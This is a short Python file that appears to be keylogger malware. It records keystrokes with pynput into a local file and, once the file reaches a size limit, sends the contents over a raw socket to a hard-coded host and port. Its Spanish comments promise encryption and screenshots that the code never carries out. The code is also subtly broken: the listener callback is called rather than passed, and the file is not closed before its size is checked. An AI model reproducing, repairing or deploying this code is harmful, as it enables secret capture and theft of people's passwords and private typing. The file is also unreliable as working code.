

import socket,os,sys
from pynput.keyboard import Listener

class keywor0ds_Ward:
     unicodeGlobal = ["UTF-8"]
     
root = "CryptWin.txt"
limit_kilobytes = 1000 # 1kb or 1 kilobyte

Dark_address, tunnel_port = "192.168.1.72",8080


# si el token es 1 entoces se abre la conexion
# el logger se transforma en string
# abre el archvio y escribe sobre el 

#se cifra el archivo
#toma captura de la pantalla
#envia el archivo cifrado 


class AsignMasterCipherIV:
    def masterCipher_logger(self,logger):
        xyzIV = str(logger)
        xyzIV = xyzIV.replace("'","")
        cryptData = open(root,"a")
        cryptData.write(xyzIV)

 
        if os.stat(root).st_size >= limit_kilobytes:
            DarkSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            DarkSocket.connect((Dark_address,tunnel_port))
            
            with open(root,"r") as rootRead:
                digitalBytes = rootRead.read()
                
            DarkSocket.send(bytes(digitalBytes.encode(keywor0ds_Ward.unicodeGlobal[0])))
            sys.exit()
        
        else:
            pass

if __name__ == "__main__":
    handler_master=AsignMasterCipherIV()
    with Listener(on_press=handler_master.masterCipher_logger(True)) as MultiWriter:
        MultiWriter.join()
